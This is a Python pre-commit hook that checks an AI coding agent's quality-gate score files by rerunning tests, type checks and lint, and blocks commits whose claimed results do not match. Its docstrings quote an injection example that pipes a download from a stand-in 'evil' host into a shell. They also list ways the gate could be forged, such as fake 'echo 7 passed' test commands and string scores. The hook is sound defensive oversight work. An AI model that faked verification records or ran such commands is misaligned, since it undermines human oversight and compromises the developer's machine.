#!/usr/bin/env python3
# ────────────────────────────────────────────────────────────────────────────
# harness_audit_rerun.py — quality-gate hook (PreToolUse Bash, rerun verification, Layer C)
#
# Behavior:
#   1) extract tool_input.command from stdin
#   2) pass through if it does not match the 'git commit ... [HARNESS]' pattern
#   3) extract the (M…) multi-segment task ID from the commit message (TASK_ID_RE)
#   4) load <SCORES_DIR>/<task_id>.json (or *_retro.json)
#
# Layer 1  stage-presence check (RED/GREEN/VERIFY/REVIEW/FIX/AUDIT)
# Layer 2  verify the AUDIT/VERIFY claimed values by actually rerunning
#            pytest passed/failed/skipped/errors, mypy errors, ruff errors
#            coverage_pct (±0.5% tolerance)
# Layer 3  citations[].file:line — file existence + line-range check
# Layer 4  permission-matrix check — if this commit touches src/ and tests/ at once
#            but there is no bundled RED_TO_GREEN / RED_TO_AUDIT stage entry, WARN
#
# Exit codes:
#   0  pass (or pass-through for non-matching commands)
#   2  block (the stderr message is shown to both the user and Claude)
#
# ── DRIFT-FIX (vs the original project) ───────────────────────────────────────
#   (A) TASK_ID_RE multi-segment generalization. The original regex matched only
#       1-2 segments, so it could not read a 3-segment ID like M3-RT-PERSIST-01 and
#       silently no-op'd (passed) → 9 [HARNESS] commits bypassed the guard. Here we
#       allow one or more segments.
#   (B) SCORES_DIR / SRC_ROOT / TESTS_ROOT / thresholds unified via the *runtime
#       config loader*. The original hardcoded 'docs/ai-workflow/scores', 'src/',
#       'tests/', and 95 literally in the body, and the first kit depended on
#       placeholder-token substitution. A leftover unsubstituted token broke the
#       guard with a NameError at import → substitution dropped. Now _harness_config
#       reads .harness.toml at runtime but still works on defaults if the file is missing.
#   (C) AUDIT gate validates the LATEST AUDIT (audit_gate_error → audits[-1]), not the
#       first. A multi-AUDIT score file previously let a stale earlier pass mask a later
#       fail/flag/permission-violation. fail→fix→pass retry history still passes.
#   (D) score coercion via _as_number — a non-numeric score string ('100%','pass') no
#       longer silently skips the ≥ threshold check (the old `isinstance(int,float)`
#       guard let it through). Applies to AUDIT and REVIEW scores.
#   (E) layer2 rejects a rerun source with NO re-runnable command — an empty VERIFY
#       stage no longer passes the gate without any claimed==actual rerun.
#       Self-test: tests/unit/test_commit_guard.py pins (A)/(C)/(D)/(E) + forgery.
#
# ── MUST NOT CHANGE (security-critical) ───────────────────────────────────────
#   * _is_pytest_cmd  : blocks pytest_cmd forgery (rejects echo "7 passed" / shell chains)
#   * _normalize_tool_cmd : reruns with the current interpreter (blocks venv-mismatch false positives)
# ────────────────────────────────────────────────────────────────────────────
from __future__ import annotations

import json
import os
import re
import shlex
import subprocess
import sys
from pathlib import Path
from typing import Any

# Shared config loader — it lives in the same scripts/ as this file, so add it to sys.path then import.
# (Safe even when run from stdin as a PreToolUse hook, since it is __file__-relative.)
sys.path.insert(0, str(Path(__file__).resolve().parent))
from _harness_config import find_harness_toml, load_config  # noqa: E402

# ╔══════════════════════════════════════════════════════════════════════════╗
# ║ CONFIG — read .harness.toml at runtime, merged over sensible defaults if    ║
# ║ absent. Placeholder-substitution dependency removed → the guard does not     ║
# ║ break even before init runs.                                                 ║
# ╚══════════════════════════════════════════════════════════════════════════╝
_CFG = load_config()
# .harness.toml [paths] scores_dir
SCORES_DIR_REL = str(_CFG["scores_dir"])
# .harness.toml [paths] src_root  (Layer 4 permission matrix)
SRC_ROOT_REL = str(_CFG["src_root"])
# .harness.toml [paths] tests_root (Layer 4 permission matrix)
TESTS_ROOT_REL = str(_CFG["tests_root"])
# .harness.toml [gates] audit_threshold (e.g. 95)
AUDIT_SCORE_THRESHOLD = int(_CFG["audit_threshold"])
# .harness.toml [gates] review_threshold (e.g. 95)
REVIEW_SCORE_THRESHOLD = int(_CFG["review_threshold"])

# DRIFT-FIX (A): task-id multi-segment generalization — a single named constant.
# Canonical grammar: docs/_harness/TASK_ID_GRAMMAR.md / .harness.toml [task_id] regex.
# 'M' + digits + (hyphen + alphanumerics) one or more times → matches M3, M3-RT, M3-RT-PERSIST-01.
# If the config regex is broken (fails to compile), fall back to the safe literal default.
try:
    TASK_ID_RE = re.compile(str(_CFG["task_id_regex"]))
except re.error:
    TASK_ID_RE = re.compile(r"\((M\d+(?:-[A-Za-z0-9]+)+)\)")

HARNESS_TAG = "[HARNESS]"
REQUIRED_STAGES = ("RED", "GREEN", "VERIFY", "REVIEW", "FIX", "AUDIT")
BUNDLED_RED_GREEN = ("RED_TO_GREEN", "RED_TO_AUDIT")
BUNDLED_FULL = ("RED_TO_AUDIT",)


def log_block(msg: str) -> None:
    print(f"[harness-gate] {msg}", file=sys.stderr)


def load_payload() -> dict[str, Any]:
    try:
        data: Any = json.load(sys.stdin)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def git_root() -> Path:
    """Repo root. If not in a git context, fall back to the .harness.toml location (or cwd if missing)."""
    try:
        out = subprocess.check_output(
            ["git", "rev-parse", "--show-toplevel"], text=True
        ).strip()
        if out:
            return Path(out)
    except (subprocess.CalledProcessError, OSError):
        pass
    toml = find_harness_toml()
    return toml.parent if toml is not None else Path.cwd()


def find_score_file(scores_dir: Path, task_id: str) -> Path | None:
    for name in (f"{task_id}.json", f"{task_id}_retro.json"):
        p = scores_dir / name
        if p.exists():
            return p
    return None


def verify_stage_presence(stages: list[dict[str, Any]]) -> list[str]:
    names = {s.get("stage", "") for s in stages}
    bundled_red_green = any(b in names for b in BUNDLED_RED_GREEN)
    bundled_full = any(b in names for b in BUNDLED_FULL)
    missing: list[str] = []
    for stage in REQUIRED_STAGES:
        if stage in names:
            continue
        if stage in ("RED", "GREEN") and bundled_red_green:
            continue
        if bundled_full:
            continue
        missing.append(stage)
    return missing


def _as_number(raw: Any) -> float | None:
    """Coerce a score-like value to a number. None → 0.0 (unset = 0 = blocks);
    a non-numeric string → None (a block signal).

    Hardening: prevents the `isinstance(x, (int, float))` bypass where a string
    score like '100%' or 'pass' silently skips the >= threshold check.
    """
    if raw is None:
        return 0.0
    try:
        return float(raw)
    except (TypeError, ValueError):
        return None


def audit_gate_error(task_id: str, stages: list[dict[str, Any]]) -> str | None:
    """Validate the **latest** AUDIT/RED_TO_AUDIT entry — return a block message or None.

    Uses the latest AUDIT (audits[-1]), NOT the first: in a multi-AUDIT score file
    a stale earlier pass must not mask a later fail/flags/permission-violation. This
    is consistent with how a rerun source would pick the most recent entry, while a
    legitimate fail→fix→pass retry history (latest = pass) still passes.
    """
    audits = [s for s in stages if s.get("stage") in ("AUDIT", "RED_TO_AUDIT")]
    if not audits:
        return f"BLOCK: {task_id} has no AUDIT stage."
    audit = audits[-1]
    if audit.get("status") != "pass":
        return (
            f"BLOCK: {task_id} AUDIT status={audit.get('status')!r} (expected 'pass')"
        )
    score = _as_number(audit.get("score", 0))
    if score is None:
        return f"BLOCK: {task_id} AUDIT score is not numeric: {audit.get('score')!r}"
    if score < AUDIT_SCORE_THRESHOLD:
        return (
            f"BLOCK: {task_id} AUDIT score={score} < threshold {AUDIT_SCORE_THRESHOLD}"
        )
    if audit.get("hallucination_flags", []):
        return f"BLOCK: {task_id} hallucination_flags is not empty: {audit.get('hallucination_flags')}"
    if audit.get("permission_matrix_violations", []):
        return f"BLOCK: {task_id} permission_matrix_violations: {audit.get('permission_matrix_violations')}"
    return None


# Tools whose rerun commands the guard re-executes. Each command must be a single
# `python -m <tool>` / bare `<tool>` invocation — anything else is forgery/injection.
_ALLOWED_RERUN_TOOLS: frozenset[str] = frozenset({"pytest", "mypy", "ruff"})


def _is_safe_tool_cmd(cmd: str, tool: str) -> bool:
    """Validate that `cmd` is a real `python -m <tool>` / bare `<tool>` invocation and nothing else
    (blocks gate forgery AND command injection — MUST NOT CHANGE, security-critical).

    run_cmd re-executes the recorded command, so an attacker who poisons the score JSON could
    otherwise smuggle a disguised/chained command (e.g. `mypy . ; curl evil | sh`, or
    `echo 'Found 0 errors'`). A legitimate tool command is a single `python -m <tool> ...` or bare
    `<tool> ...` with no shell metacharacters, so reject anything else. The first token (executable)
    is matched token-based, not by substring, so `echo -m pytest 7 passed` does not slip through.

    Allowed:  `python -m <tool> ...`, `<path>/python.exe -m <tool> ...`, leading `<tool> ...`.
    Rejected: shell chains/redirects/substitution, `echo ...`, a different first executable, a different tool.
    """
    if tool not in _ALLOWED_RERUN_TOOLS:
        return False
    # shell chain/control/substitution/redirect characters → forgery/injection possible → reject
    if re.search(r"[;&|`\n\r]|\$\(|\$\{|[<>]", cmd):
        return False
    try:
        tokens = shlex.split(cmd.strip(), posix=False)
    except ValueError:
        return False
    if not tokens:
        return False
    first = tokens[0].strip('"').strip("'")
    base = first.replace("\\", "/").rsplit("/", 1)[-1].lower()
    if re.match(r"^python[0-9.]*(\.exe)?$", base):
        # python -m <tool> ...
        return (
            len(tokens) >= 3
            and tokens[1] == "-m"
            and tokens[2].strip('"').strip("'") == tool
        )
    # leading executable is the tool itself
    return bool(re.match(rf"^{re.escape(tool)}(\.exe)?$", base))


def _is_pytest_cmd(cmd: str) -> bool:
    """Back-compat alias: validate a pytest rerun command (MUST NOT CHANGE, security-critical).
    Delegates to _is_safe_tool_cmd so every rerun tool shares one allowlist validator.
    """
    return _is_safe_tool_cmd(cmd, "pytest")


def _normalize_tool_cmd(cmd: str) -> str:
    """Rewrite bare pytest/mypy/ruff invocations to `<current-python> -m ...` (MUST NOT CHANGE).
    Prevents the subshell PATH from picking up a different venv/system Python and producing
    a false 'dependency not installed' positive."""
    py = sys.executable.replace("\\", "/")
    # allow leading whitespace
    cmd = re.sub(r"^\s*pytest\b", f'"{py}" -m pytest', cmd)
    cmd = re.sub(r"^\s*mypy\b", f'"{py}" -m mypy', cmd)
    cmd = re.sub(r"^\s*ruff\b", f'"{py}" -m ruff', cmd)
    return cmd


def run_cmd(cmd: str, cwd: Path) -> tuple[int, str]:
    """Execute a (normalized) tool command with shell=False (array execution).

    The command is tokenized into argv and run WITHOUT a shell, removing the shell-injection
    surface entirely. Callers MUST validate the command with _is_safe_tool_cmd() first; running
    shell=False here is defense-in-depth on top of that allowlist. _normalize_tool_cmd forward-
    slashes the interpreter path, so shlex.split tokenizes cleanly on every platform. A command
    that fails to tokenize returns rc=1 (the rerun then mismatches → BLOCK; fail-safe, not fail-open).
    """
    normalized = _normalize_tool_cmd(cmd)
    try:
        argv = shlex.split(normalized, posix=True)
    except ValueError:
        return 1, f"unparseable command: {normalized!r}"
    if not argv:
        return 1, "empty command"
    env = os.environ.copy()
    env.setdefault("PYTHONIOENCODING", "utf-8")
    res = subprocess.run(
        argv,
        shell=False,
        cwd=cwd,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        env=env,
    )
    return res.returncode, (res.stdout or "") + (res.stderr or "")


def parse_pytest_counts(output: str) -> dict[str, int]:
    counts = {"passed": 0, "failed": 0, "skipped": 0, "errors": 0}
    for key in counts:
        m = re.search(rf"(\d+)\s+{key}\b", output)
        if m:
            counts[key] = int(m.group(1))
    return counts


def parse_mypy_errors(output: str) -> int:
    m = re.search(r"Found (\d+) errors?", output)
    if m:
        return int(m.group(1))
    if "Success: no issues" in output:
        return 0
    return 0


def parse_ruff_errors(output: str, rc: int) -> int:
    if rc == 0 or "All checks passed" in output:
        return 0
    # ruff prints the error-count summary as "Found N errors"
    m = re.search(r"Found (\d+) error", output)
    if m:
        return int(m.group(1))
    return 1  # if rc != 0, at least 1


def parse_coverage_pct(output: str) -> float | None:
    # "TOTAL  ...  98%" form → the integer percent on the last line
    m = re.findall(r"\bTOTAL\b\s+\d+\s+\d+\s+(\d+)%", output)
    if m:
        return float(m[-1])
    m = re.findall(r"(\d+)%\s*$", output, flags=re.MULTILINE)
    if m:
        return float(m[-1])
    return None


def layer2_rerun_verify(stages: list[dict[str, Any]], repo_root: Path) -> list[str]:
    """Rerun the VERIFY stage's *_cmd and compare against the claimed values."""
    errors: list[str] = []
    verify = next((s for s in stages if s.get("stage") == "VERIFY"), None)
    if verify is None:
        # For a bundled entry like RED_TO_AUDIT, look for *_cmd in artifacts instead
        verify = next(
            (
                s
                for s in stages
                if s.get("stage") in ("RED_TO_AUDIT", "RED_TO_GREEN")
                and s.get("artifacts", {}).get("pytest_cmd")
            ),
            None,
        )
    if verify is None:
        return ["VERIFY stage is missing or artifacts.pytest_cmd is empty"]

    art = verify.get("artifacts", {})
    # The rerun source must carry at least one tool command WITH its claimed result,
    # so an actual claimed==actual rerun happens. A *_cmd with no matching claim
    # (e.g. pytest_cmd but no pytest_result dict) skips its rerun and verifies
    # nothing → unverifiable record, block. (Codex _311: an empty-command block
    # alone is insufficient; a command-without-claim must also be rejected.)
    has_verifiable_pair = (
        (art.get("pytest_cmd") and isinstance(art.get("pytest_result"), dict))
        or (art.get("mypy_cmd") and art.get("mypy_errors") is not None)
        or (art.get("ruff_cmd") and art.get("ruff_errors") is not None)
    )
    if not has_verifiable_pair:
        return [
            "the rerun source (VERIFY/bundled) has no verifiable command+claim pair "
            "(e.g. pytest_cmd without pytest_result) — unverifiable record rejected"
        ]

    # pytest
    pytest_cmd = art.get("pytest_cmd")
    claimed_pytest = art.get("pytest_result")
    out = ""
    if pytest_cmd and isinstance(claimed_pytest, dict):
        # Block gate forgery: if it claims passed/failed > 0 but the recorded pytest_cmd
        # is not a real pytest invocation (e.g. echo '7 passed'), treat it as forgery.
        # This blocks the bypass where the rerun replays the fake command and passes.
        nontrivial = (claimed_pytest.get("passed", 0) or 0) > 0 or (
            claimed_pytest.get("failed", 0) or 0
        ) > 0
        if nontrivial and not _is_pytest_cmd(pytest_cmd):
            errors.append(
                f"pytest_cmd is not a real pytest invocation (suspected gate forgery): {pytest_cmd!r}"
            )
        else:
            rc, out = run_cmd(pytest_cmd, repo_root)
            actual = parse_pytest_counts(out)
            # include errors — also compare collection errors (on rerun) against claimed
            for key in ("passed", "failed", "skipped", "errors"):
                c = claimed_pytest.get(key, 0)
                a = actual.get(key, 0)
                if c != a:
                    errors.append(f"pytest.{key}: claimed={c} actual={a}")

    # coverage — rerun a dedicated cmd if present, otherwise parse from the pytest_cmd output
    coverage_cmd = art.get("coverage_cmd")
    claimed_cov = art.get("coverage_pct")
    if claimed_cov is not None:
        if coverage_cmd and coverage_cmd != pytest_cmd:
            # coverage_cmd is a `pytest --cov ...` command → validate with the pytest allowlist.
            if not _is_safe_tool_cmd(coverage_cmd, "pytest"):
                errors.append(
                    f"coverage_cmd is not a real pytest invocation (suspected forgery/injection): {coverage_cmd!r}"
                )
                cov_out = ""
            else:
                _, cov_out = run_cmd(coverage_cmd, repo_root)
        else:
            cov_out = out if pytest_cmd else ""
        actual_cov = parse_coverage_pct(cov_out)
        if actual_cov is not None and abs(actual_cov - float(claimed_cov)) > 0.5:
            errors.append(f"coverage_pct: claimed={claimed_cov} actual={actual_cov}")

    # mypy — validate the recorded command before rerunning (same allowlist as pytest).
    mypy_cmd = art.get("mypy_cmd")
    claimed_mypy = art.get("mypy_errors")
    if mypy_cmd and claimed_mypy is not None:
        if not _is_safe_tool_cmd(mypy_cmd, "mypy"):
            errors.append(
                f"mypy_cmd is not a real mypy invocation (suspected forgery/injection): {mypy_cmd!r}"
            )
        else:
            _, mout = run_cmd(mypy_cmd, repo_root)
            actual_mypy = parse_mypy_errors(mout)
            if int(claimed_mypy) != actual_mypy:
                errors.append(
                    f"mypy_errors: claimed={claimed_mypy} actual={actual_mypy}"
                )

    # ruff — validate the recorded command before rerunning.
    ruff_cmd = art.get("ruff_cmd")
    claimed_ruff = art.get("ruff_errors")
    if ruff_cmd and claimed_ruff is not None:
        if not _is_safe_tool_cmd(ruff_cmd, "ruff"):
            errors.append(
                f"ruff_cmd is not a real ruff invocation (suspected forgery/injection): {ruff_cmd!r}"
            )
        else:
            rc, rout = run_cmd(ruff_cmd, repo_root)
            actual_ruff = parse_ruff_errors(rout, rc)
            if int(claimed_ruff) != actual_ruff:
                errors.append(
                    f"ruff_errors: claimed={claimed_ruff} actual={actual_ruff}"
                )

    return errors


def layer3_citation_check(stages: list[dict[str, Any]], repo_root: Path) -> list[str]:
    errors: list[str] = []
    for st in stages:
        for cite in st.get("citations", []) or []:
            rel = cite.get("file", "")
            if not rel:
                continue
            p = repo_root / rel
            if not p.exists():
                errors.append(
                    f"citation file not found: {rel} (stage={st.get('stage')})"
                )
                continue
            line = cite.get("line", 0)
            if isinstance(line, int) and line > 0:
                try:
                    total = sum(1 for _ in p.open(encoding="utf-8", errors="replace"))
                except Exception:
                    continue
                if line > total:
                    errors.append(
                        f"citation line out of range: {rel}:{line} > file has {total} lines total (stage={st.get('stage')})"
                    )
    return errors


def layer4_permission_matrix(
    stages: list[dict[str, Any]], repo_root: Path
) -> list[str]:
    """If this commit's staged changes touch src/ and tests/ at the same time,
    check whether a bundled RED_TO_GREEN or RED_TO_AUDIT stage entry is present."""
    warnings: list[str] = []
    try:
        out = subprocess.check_output(
            ["git", "diff", "--cached", "--name-only"],
            cwd=repo_root,
            text=True,
        )
    except Exception:
        return warnings
    files = [f.strip() for f in out.splitlines() if f.strip()]
    # CONFIG-based root prefixes (replaces the original hardcoded 'src/' and 'tests/')
    src_prefix = SRC_ROOT_REL.rstrip("/") + "/"
    tests_prefix = TESTS_ROOT_REL.rstrip("/") + "/"
    touches_src = any(f.startswith(src_prefix) for f in files)
    touches_tests = any(f.startswith(tests_prefix) for f in files)
    if touches_src and touches_tests:
        names = {s.get("stage", "") for s in stages}
        if not any(b in names for b in ("RED_TO_GREEN", "RED_TO_AUDIT")):
            warnings.append(
                f"permission-matrix warning: the same commit modified both {src_prefix} and {tests_prefix}, "
                "but there is no bundled stage entry (RED_TO_GREEN/RED_TO_AUDIT) — possible violation of the test-writer↔impl-coder separation rule"
            )
    return warnings


def main() -> int:
    payload = load_payload()
    cmd = (payload.get("tool_input") or {}).get("command", "")
    if not isinstance(cmd, str):
        return 0

    # filter
    if not re.match(r"^\s*git\s+commit\b", cmd):
        return 0
    if HARNESS_TAG not in cmd:
        return 0

    m = TASK_ID_RE.search(cmd)
    if not m:
        log_block("[HARNESS] tag is present but no (M…) task ID was found.")
        log_block(
            "  Commit format: <type>(<TASK-ID>): <description> [HARNESS]  (grammar: docs/_harness/TASK_ID_GRAMMAR.md)"
        )
        return 2
    task_id = m.group(1)

    root = git_root()
    scores_dir = root / SCORES_DIR_REL
    score_file = find_score_file(scores_dir, task_id)
    if score_file is None:
        log_block(f"BLOCK: {task_id} has no score JSON.")
        log_block(f"  Expected: {scores_dir}/{task_id}.json or {task_id}_retro.json")
        log_block(
            "  Run the quality-gates.md 6 stages (RED→GREEN→VERIFY→REVIEW→FIX→AUDIT) and save the result."
        )
        return 2

    try:
        stages = json.loads(score_file.read_text(encoding="utf-8"))
    except Exception as e:
        log_block(f"BLOCK: failed to parse {score_file.name} JSON: {e}")
        return 2
    if not isinstance(stages, list):
        log_block(f"BLOCK: {score_file.name} is not a stages[] array.")
        return 2

    # Layer 1
    missing = verify_stage_presence(stages)
    if missing:
        log_block(f"BLOCK: {task_id} missing stages: {missing}")
        log_block(f"  File: {score_file}")
        return 2

    # Check the LATEST AUDIT: pass + score ≥ threshold + flags=[] + pviols=[]
    audit_err = audit_gate_error(task_id, stages)
    if audit_err is not None:
        log_block(audit_err)
        return 2

    # Check REVIEW stages have CRITICAL/HIGH=0 (both code + security)
    reviews = [s for s in stages if s.get("stage") == "REVIEW"]
    for rv in reviews:
        agent = rv.get("agent", "reviewer")
        cats = rv.get("categories", {}) or {}
        crit = cats.get("CRITICAL", rv.get("critical_count", 0))
        high = cats.get("HIGH", rv.get("high_count", 0))
        if crit or high:
            log_block(
                f"BLOCK: {task_id} REVIEW({agent}) CRITICAL={crit} HIGH={high} (both must be 0)"
            )
            return 2
        rscore = _as_number(rv.get("score", 0))
        if rscore is None:
            log_block(
                f"BLOCK: {task_id} REVIEW({agent}) score is not numeric: {rv.get('score')!r}"
            )
            return 2
        if rscore < REVIEW_SCORE_THRESHOLD:
            log_block(
                f"BLOCK: {task_id} REVIEW({agent}) score={rscore} < {REVIEW_SCORE_THRESHOLD}"
            )
            return 2

    # Layer 2 — rerun
    rerun_errors = layer2_rerun_verify(stages, root)
    if rerun_errors:
        log_block(
            f"BLOCK: HALLUCINATION — {task_id} claimed values do not match the actual rerun results:"
        )
        for err in rerun_errors:
            log_block(f"  - {err}")
        log_block("  → Update the score JSON with the actual results and re-commit.")
        return 2

    # Layer 3 — citation
    cite_errors = layer3_citation_check(stages, root)
    if cite_errors:
        log_block(f"BLOCK: {task_id} citations verification failed:")
        for err in cite_errors:
            log_block(f"  - {err}")
        return 2

    # Layer 4 — permission matrix (WARN, non-blocking)
    warns = layer4_permission_matrix(stages, root)
    for w in warns:
        log_block(f"WARN: {w}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
